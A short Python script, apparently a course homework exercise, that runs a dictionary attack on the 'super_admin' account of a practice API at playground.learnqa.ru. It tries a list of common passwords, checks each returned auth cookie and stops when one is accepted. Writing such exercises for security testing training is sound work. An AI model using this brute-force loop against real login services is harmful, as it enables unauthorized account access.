import requests
_author__ = 'Stangli Adadurov'

urlGet = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
urlCheck = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

passwords = ["1234", "12345", "111111", "121212", "123123", "123456", "555555", "654321", "666666", "696969", "888888",
             '1234567', "7777777", "12345678", "123456789", "1234567890", "!@#$%^&*", "000000", "123qwe", "1q2w3e4r",
             "1qaz2wsx", "aa123456", "abc123", "access", "admin", "adobe123", "ashley", "azerty", "bailey", "baseball",
             "batman", "charlie", "donald", "dragon", "flower", "Football", "freedom", "hello", "hottie", "iloveyou",
             "jesus", "letmein", "login", "lovely", "loveme", "master", "michael", "monkey", "mustang", "ninja",
             "passw0rd", "password", "password", "password1", "photoshop", "princess", "qazwsx", "qwerty", "qwerty123",
             "qwertyuiop", "shadow", "solo", "starwars", "sunshine", "superman", "trustno1", "welcome", "whatever",
             "zaq1zaq1"]

payload = {"login": "super_admin"}
print("Please, wait. Passwords are being searched")
for password in passwords:
    payload["password"] = password
    response = requests.post(urlGet, data=payload)
    cookie_value = response.cookies.get('auth_cookie')
    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})
    response2 = requests.get(urlCheck, cookies=cookies)
    print(f"Check password: {password}")
    if response2.text != "You are NOT authorized":
        print(f"Your password is: {password}. {response2.text}")
        break
